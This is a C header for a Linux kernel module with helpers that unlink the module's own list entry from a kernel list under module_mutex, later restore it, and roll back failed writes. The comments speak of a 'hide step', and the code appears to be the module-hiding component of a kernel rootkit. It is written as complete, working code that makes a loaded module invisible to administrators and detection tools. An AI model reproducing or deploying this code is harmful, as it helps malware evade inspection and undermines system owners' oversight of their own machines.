/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NEVERC_KRT_VIS_LIST_H
#define NEVERC_KRT_VIS_LIST_H

#include <linux/errno.h>

#ifndef NEVERC_KRT_VIS_LIST_VALID_PTR
#define NEVERC_KRT_VIS_LIST_VALID_PTR(ptr) \
	((unsigned long)(ptr) >= 0xFFFF000000000000UL && \
	 (unsigned long)(ptr) < 0xFFFFFFFFFFFFF000UL)
#endif

/*
 * These helpers require module_mutex to be held.  They use nofault accesses
 * for every neighbor dereference and roll back the first link if the second
 * write fails.
 */
static __always_inline int _neverc_krt_vis_list_unlink(
	struct list_head *our, struct list_head **saved_prev,
	struct list_head **saved_next)
{
	struct list_head *next;
	struct list_head *prev;
	struct list_head *next_prev;
	struct list_head *prev_next;
	int ret;

	if (!our || !saved_prev || !saved_next)
		return -EINVAL;
	if (neverc_krt_mem_read(&next, &our->next, sizeof(next)) ||
	    neverc_krt_mem_read(&prev, &our->prev, sizeof(prev)))
		return -EFAULT;
	if (!NEVERC_KRT_VIS_LIST_VALID_PTR(next) ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(prev) ||
	    next == our || prev == our)
		return -EUCLEAN;
	if (neverc_krt_mem_read(
		    &prev_next, &prev->next, sizeof(prev_next)) ||
	    neverc_krt_mem_read(
		    &next_prev, &next->prev, sizeof(next_prev)))
		return -EFAULT;
	if (prev_next != our || next_prev != our)
		return -EUCLEAN;

	ret = (int)neverc_krt_mem_write(
		&prev->next, &next, sizeof(next));
	if (ret)
		return ret;
	ret = (int)neverc_krt_mem_write(
		&next->prev, &prev, sizeof(prev));
	if (ret) {
		if (neverc_krt_mem_write(
			    &prev->next, &our, sizeof(our)))
			return -EUCLEAN;
		return ret;
	}

	WRITE_ONCE(our->next, our);
	WRITE_ONCE(our->prev, our);
	*saved_prev = prev;
	*saved_next = next;
	return 0;
}

static __always_inline int _neverc_krt_vis_list_restore(
	struct list_head *head, struct list_head *our)
{
	struct list_head *current_next;
	struct list_head *current_prev;
	struct list_head *first;
	struct list_head *first_prev;
	int ret;

	if (!head || !our ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(head) ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(our))
		return -EINVAL;
	if (neverc_krt_mem_read(
		    &current_next, &our->next, sizeof(current_next)) ||
	    neverc_krt_mem_read(
		    &current_prev, &our->prev, sizeof(current_prev)))
		return -EFAULT;
	if (current_next != our || current_prev != our)
		return -EUCLEAN;
	if (neverc_krt_mem_read(&first, &head->next, sizeof(first)) ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(first))
		return -EFAULT;
	if (neverc_krt_mem_read(
		    &first_prev, &first->prev, sizeof(first_prev)))
		return -EFAULT;
	if (first_prev != head)
		return -EUCLEAN;

	WRITE_ONCE(our->next, first);
	WRITE_ONCE(our->prev, head);
	ret = (int)neverc_krt_mem_write(
		&first->prev, &our, sizeof(our));
	if (ret) {
		WRITE_ONCE(our->next, our);
		WRITE_ONCE(our->prev, our);
		return ret;
	}
	ret = (int)neverc_krt_mem_write(
		&head->next, &our, sizeof(our));
	if (ret) {
		if (neverc_krt_mem_write(
			    &first->prev, &head, sizeof(head)))
			return -EUCLEAN;
		WRITE_ONCE(our->next, our);
		WRITE_ONCE(our->prev, our);
		return ret;
	}
	return 0;
}

/*
 * Immediate rollback to the saved neighbors.  Use this when a later
 * hide step fails right after unlink and the list has not moved.
 */
static __always_inline int _neverc_krt_vis_list_restore_neighbors(
	struct list_head *our, struct list_head *prev, struct list_head *next)
{
	struct list_head *prev_next;
	struct list_head *next_prev;
	int ret;

	if (!our || !prev || !next ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(our) ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(prev) ||
	    !NEVERC_KRT_VIS_LIST_VALID_PTR(next))
		return -EINVAL;
	if (neverc_krt_mem_read(&prev_next, &prev->next, sizeof(prev_next)) ||
	    neverc_krt_mem_read(&next_prev, &next->prev, sizeof(next_prev)))
		return -EFAULT;
	if (prev_next != next || next_prev != prev)
		return -EUCLEAN;

	WRITE_ONCE(our->next, next);
	WRITE_ONCE(our->prev, prev);
	ret = (int)neverc_krt_mem_write(&prev->next, &our, sizeof(our));
	if (ret) {
		WRITE_ONCE(our->next, our);
		WRITE_ONCE(our->prev, our);
		return ret;
	}
	ret = (int)neverc_krt_mem_write(&next->prev, &our, sizeof(our));
	if (ret) {
		if (neverc_krt_mem_write(&prev->next, &next, sizeof(next)))
			return -EUCLEAN;
		WRITE_ONCE(our->next, our);
		WRITE_ONCE(our->prev, our);
		return ret;
	}
	return 0;
}

#endif /* NEVERC_KRT_VIS_LIST_H */
